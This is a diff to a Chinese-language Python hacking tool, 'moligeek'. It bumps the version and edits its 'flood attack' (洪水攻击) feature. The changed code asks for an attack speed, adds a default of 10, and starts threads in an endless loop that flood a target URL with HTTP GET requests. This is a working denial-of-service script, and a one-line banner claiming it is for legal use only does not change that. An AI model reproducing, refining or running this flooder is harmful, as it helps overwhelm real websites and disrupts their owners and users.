@@ -13,7 +13,7 @@ name = """_ _                 _
                      |___/"""
 print(name)
 print("="*45)
-print("v0.1.0(测试版)")
+print("v0.1.1(测试版)")
 print("开源地址:https://github.com/yourmoln/moligeek")
 print("本工具仅限于合法用途，交流Q群:564136017")
 print("="*45)
@@ -200,7 +200,11 @@ def shaomiao(i):
 #洪水攻击
 def startattack():
     n=0
-    speed=int(input("请输入攻击速度(小心卡死自己):"))
+    try:
+        speed=int(input("请输入攻击速度(小心卡死自己):"))
+    except:
+        speed=10
+        print("未设置速度默认为10")
     while 1:
         n+=speed
         t1 = threading.Thread(target=attack,args=(speed,))
@@ -213,7 +217,7 @@ def attack(speed):
             r = requests.get(url,headers)
         except:
             #print("发送失败")
-            nf+=1
+            nf+=speed
             break
         speed-=1
         
